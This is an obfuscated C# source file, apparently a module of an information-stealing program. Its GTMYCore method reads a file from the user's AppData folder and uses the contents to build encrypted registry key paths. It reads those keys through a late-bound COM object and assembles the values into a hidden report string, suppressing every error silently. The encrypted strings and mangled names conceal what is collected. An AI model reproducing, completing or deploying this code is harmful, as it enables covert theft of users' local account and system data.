using System;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class DACore
{
	public class Coredll
	{
		public static void GTMYCore()
		{
			try
			{
				string sFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("jpDH0bZ4oai7xJvBvdJ/m7HQFw==", "False");
				string text = RDFLE2(sFile);
				string text2 = RGRD2(GOSLWHR.WHJBIYT("iaesx7+EsbnApY+wxsOzhq7Dwc+n0N7P0qa4rcKwmL3Z07yEq7mzppWsw8HJtcHaygk=", "False") + text + GOSLWHR.WHJBIYT("k5rM18oP", "False"));
				string text3 = RGRD2(GOSLWHR.WHJBIYT("jqyxzMSJtr7FqpS1y8i4i7PIxtSs1ePU16u9sse1ncLe2MGJsL64q5qxyMbOusbfzwQ=", "False") + text + GOSLWHR.WHJBIYT("jp3H0cUU", "False"));
				string text4 = RGRD2(GOSLWHR.WHJBIYT("d5Wata1yn6euk32etLGhdJyxr72Vvsy9wJSmm7CehqvHwapymaehlIOasa+3o6/IuBs=", "False") + text + GOSLWHR.WHJBIYT("ma3Wz84J", "False"));
				string text5 = RGRD2(GOSLWHR.WHJBIYT("bIqPqqJnlJyjiHKTqaaWaZGmpLKKs8GytYmbkKWTe6C8tp9njpyWiXiPpqSsmKS9rSY=", "False") + text + GOSLWHR.WHJBIYT("g5KkIg==", "False"));
				string text6 = RGRD2(GOSLWHR.WHJBIYT("jKqvysKHtLzDqJKzyca2ibHGxNKq0+HS1am7sMWzm8Dc1r+Hrry2qZivxsTMuMTdzQY=", "False") + text + GOSLWHR.WHJBIYT("g5Cuwasf", "False"));
				string text7 = (NTUIYURW.QEFKD = ((Operators.CompareString(text4, "", false) == 0) ? (GOSLWHR.WHJBIYT("fJeiqZt8l6Kpm3yXqNvQpKC5vJt8l6Kpm3yXoqmbfJeiCg==", "False") + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("frrKxbiesnajvqW5uhk=", "False") + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("bIeSmYtsh5KZi2yHkpmLbIeSmYtsh5KZi2yHkpmLbIcZ", "False")) : (GOSLWHR.WHJBIYT("fJeiqZt8l6Kpm3yXqNvQpKC5vJt8l6Kpm3yXoqmbfJeiCg==", "False") + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("XKCxtq9RUjE=", "False") + text6 + Environment.NewLine + GOSLWHR.WHJBIYT("aqy7w3tCJQ==", "False") + text2 + GOSLWHR.WHJBIYT("axY=", "False") + text3 + Environment.NewLine + GOSLWHR.WHJBIYT("bKWitqR4n6J+Vi8=", "False") + text4 + Environment.NewLine + GOSLWHR.WHJBIYT("cJy5wLaPraqHXyY=", "False") + text5 + GOSLWHR.WHJBIYT("O16Gtp2Nr7G8Yys=", "False") + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("b4qVnI5vipWcjm+KlZyOb4qVnI5vipWcjm+KlZyOb4oW", "False"))));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				NTUIYURW.QEFKD = "";
				ProjectData.ClearProjectError();
			}
		}

		public static string RGRD2(string hKey)
		{
			string result = default(string);
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(GOSLWHR.WHJBIYT("eZCrwaqSsXaiqYeptCc=", "False"), ""));
				object[] array = new object[1] { hKey };
				bool[] array2 = new bool[1] { true };
				object obj = NewLateBinding.LateGet(objectValue, (Type)null, "RGRD", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					hKey = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				}
				result = Conversions.ToString(obj);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string RDFLE2(string sFile)
		{
			string result = default(string);
			try
			{
				StreamReader streamReader = new StreamReader(sFile);
				result = streamReader.ReadToEnd().ToString();
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
